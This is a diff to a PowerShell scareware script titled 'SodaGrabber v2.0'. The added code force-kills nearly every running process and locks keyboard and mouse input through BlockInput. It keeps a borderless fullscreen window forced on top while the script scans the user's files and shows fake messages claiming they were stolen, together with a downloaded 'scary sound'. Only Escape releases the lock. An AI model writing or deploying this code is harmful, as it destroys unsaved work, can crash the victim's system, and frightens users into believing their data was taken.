@@ -1,3 +1,19 @@
+# Kill everything first
+Get-Process | Where-Object { $_.Name -ne "powershell" -and $_.Name -ne "cmd" } | Stop-Process -Force -ErrorAction SilentlyContinue
+
+# Block input and other windows
+$signature = @'
+[DllImport("user32.dll")]
+public static extern bool BlockInput(bool fBlockIt);
+[DllImport("user32.dll")]
+public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'@
+Add-Type -MemberDefinition $signature -Name WindowAPI -Namespace API
+
+[API.WindowAPI]::BlockInput($true)
+
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
@@ -15,27 +31,26 @@ $soundPath = "$env:TEMP\scary_sound.mp3"
 
 try {
     Invoke-WebRequest -Uri $soundUrl -OutFile $soundPath -ErrorAction Stop
-    Start-Process $soundPath
-    $wshell = New-Object -ComObject WScript.Shell
-    $wshell.Run($soundPath, 1, $false)
-    $shell = New-Object -ComObject Shell.Application
-    $shell.Open($soundPath)
-    explorer.exe $soundPath
-    cmd /c start $soundPath
-} catch {
-    Write-Host "Sound download failed"
-}
+    Start-Process $soundPath -WindowStyle Minimized
+} catch {}
 
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "SodaGrabber v2.0 - SYSTEM ACCESS"
 $form.WindowState = "Maximized"
 $form.FormBorderStyle = "None"
 $form.TopMost = $true
+$form.TopLevel = $true
+$form.BringToFront()
+$form.Activate()
+$form.Focus()
+$form.ControlBox = $false
+$form.ShowInTaskbar = $false
 $form.BackColor = "Black"
 $form.KeyPreview = $true
 $form.Add_KeyDown({
     if ($_.KeyCode -eq "Escape") {
-        Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" -or $_.Name -like "*Media*" -or $_.Name -like "*Player*" -or $_.Name -like "*VLC*" } | Stop-Process -Force
+        [API.WindowAPI]::BlockInput($false)
+        Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" } | Stop-Process -Force
         $form.Close()
         [System.Windows.Forms.Application]::Exit()
     }
@@ -44,7 +59,7 @@ $form.Add_KeyDown({
 $label = New-Object System.Windows.Forms.Label
 $label.ForeColor = "Lime"
 $label.BackColor = "Black"
-$label.Font = New-Object System.Drawing.Font("Consolas", 9, [System.Drawing.FontStyle]::Bold)
+$label.Font = New-Object System.Drawing.Font("Consolas", 10, [System.Drawing.FontStyle]::Bold)
 $label.Text = ""
 $label.AutoSize = $false
 $label.Size = New-Object System.Drawing.Size($form.Width, $form.Height)
@@ -91,7 +106,7 @@ $allFiles = @()
 foreach ($location in $scanLocations) {
     if (Test-Path $location) {
         try {
-            $files = Get-ChildItem -Path $location -File -ErrorAction SilentlyContinue -Recurse -Force -ErrorAction SilentlyContinue | Select-Object -First 500
+            $files = Get-ChildItem -Path $location -File -ErrorAction SilentlyContinue -Recurse -Force -ErrorAction SilentlyContinue | Select-Object -First 200
             $allFiles += $files
         } catch {}
     }
@@ -111,6 +126,7 @@ if ($allFiles.Count -eq 0) {
 
 $fileIndex = 0
 $totalFiles = $allFiles.Count
+$lastScrollTime = Get-Date
 
 while ((Get-Date) -lt $scanEndTime) {
     $currentFile = $allFiles[$fileIndex % $totalFiles]
@@ -132,18 +148,23 @@ while ((Get-Date) -lt $scanEndTime) {
     
     $elapsed = ((Get-Date) - $scanStartTime).TotalSeconds
     $percentComplete = [math]::Round(($elapsed / $scanDuration) * 100)
-    $filesPerSecond = [math]::Round($fileIndex / $elapsed, 1)
-    $label.Text += "[PROGRESS] $percentComplete% - $fileIndex files found ($filesPerSecond/sec)`n`n"
+    $label.Text += "[PROGRESS] $percentComplete% - $fileIndex files found`n`n"
+    
+    if ((Get-Date) - $lastScrollTime -gt [TimeSpan]::FromSeconds(2)) {
+        $lines = $label.Text -split "`n"
+        if ($lines.Count -gt 50) {
+            $label.Text = ($lines[-50..-1] -join "`n")
+        }
+        $lastScrollTime = Get-Date
+    }
     
     $form.Refresh()
     [System.Windows.Forms.Application]::DoEvents()
     
-    if ($label.Text.Length -gt 8000) {
-        $lines = $label.Text -split "`n"
-        $label.Text = ($lines[-60..-1] -join "`n")
-    }
+    $form.BringToFront()
+    $form.Activate()
     
-    $delay = Get-Random -Minimum 200 -Maximum 600
+    $delay = Get-Random -Minimum 300 -Maximum 700
     Start-Sleep -Milliseconds $delay
 }
 
@@ -170,6 +191,7 @@ foreach ($file in $foundFiles) {
     $label.Text += "[COMPLETED] $file transferred successfully!`n"
     $form.Refresh()
     [System.Windows.Forms.Application]::DoEvents()
+    $form.BringToFront()
 }
 
 $label.ForeColor = "Red"
@@ -205,6 +227,7 @@ while ((Get-Date) -lt $spamEnd) {
     
     Start-Sleep -Milliseconds 80
     [System.Windows.Forms.Application]::DoEvents()
+    $form.BringToFront()
 }
 
 $shell = New-Object -ComObject "Shell.Application"
@@ -223,10 +246,11 @@ $label.Text += " "*30 + "Goodbye, $username!`n"
 $form.Refresh()
 Start-Sleep -Seconds 3
 
+[API.WindowAPI]::BlockInput($false)
 $form.Close()
 [System.Windows.Forms.Application]::Exit()
 
-Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" -or $_.Name -like "*Media*" -or $_.Name -like "*Player*" -or $_.Name -like "*VLC*" -or $_.Name -like "*Windows*" } | Stop-Process -Force
+Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" } | Stop-Process -Force
 Start-Sleep -Seconds 1
 if (Test-Path $soundPath) {
     Remove-Item $soundPath -Force -ErrorAction SilentlyContinue
